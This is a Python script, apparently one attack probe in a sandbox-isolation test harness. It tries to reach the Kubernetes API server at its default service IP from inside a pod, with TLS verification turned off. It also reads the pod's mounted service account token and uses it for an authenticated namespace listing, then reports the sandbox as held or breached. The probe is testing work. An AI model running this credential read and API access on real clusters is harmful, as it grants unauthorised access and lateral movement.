#!/usr/bin/env python3
"""
Attack: net_k8s_api — Attempt to reach K8s API server from sandbox pod
Category: network

SCAFFOLD — real implementation on hack day.
"""
import json
import socket
import ssl
import sys
import time


def run():
    result = {
        "vector": "net_k8s_api",
        "category": "network",
        "status": "HELD",
        "evidence": "",
        "duration_ms": 0,
    }

    start = time.time()
    api_host = "10.96.0.1"  # Default K8s service IP
    api_port = 443

    print(json.dumps({"type": "log", "line": f"resolving kubernetes.default.svc ({api_host})"}))
    sys.stdout.flush()

    try:
        print(json.dumps({"type": "log", "line": f"connecting to {api_host}:{api_port}..."}))
        sys.stdout.flush()

        sock = socket.create_connection((api_host, api_port), timeout=5)

        # Try TLS handshake
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ssock = ctx.wrap_socket(sock, server_hostname=api_host)

        # Try reading service account token
        token_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"
        try:
            with open(token_path) as f:
                token = f.read().strip()

            # Attempt authenticated API call
            request = (
                f"GET /api/v1/namespaces HTTP/1.1\r\n"
                f"Host: {api_host}\r\n"
                f"Authorization: Bearer {token}\r\n"
                f"Connection: close\r\n\r\n"
            )
            ssock.send(request.encode())
            response = ssock.recv(1024).decode(errors="replace")

            if "200 OK" in response:
                result["status"] = "BREACH"
                result["evidence"] = "K8s API reachable + service account token valid — namespace listing returned"
            else:
                result["status"] = "BREACH"
                result["evidence"] = f"K8s API reachable (TCP+TLS), token present but: {response[:80]}"
        except FileNotFoundError:
            result["status"] = "BREACH"
            result["evidence"] = "K8s API reachable (TCP+TLS) but no SA token mounted"

        ssock.close()

    except (socket.timeout, ConnectionRefusedError, OSError) as e:
        result["evidence"] = f"connection to {api_host}:{api_port} blocked — {e}"

    result["duration_ms"] = int((time.time() - start) * 1000)
    print(json.dumps({"type": "result", **result}))
    sys.stdout.flush()


if __name__ == "__main__":
    run()
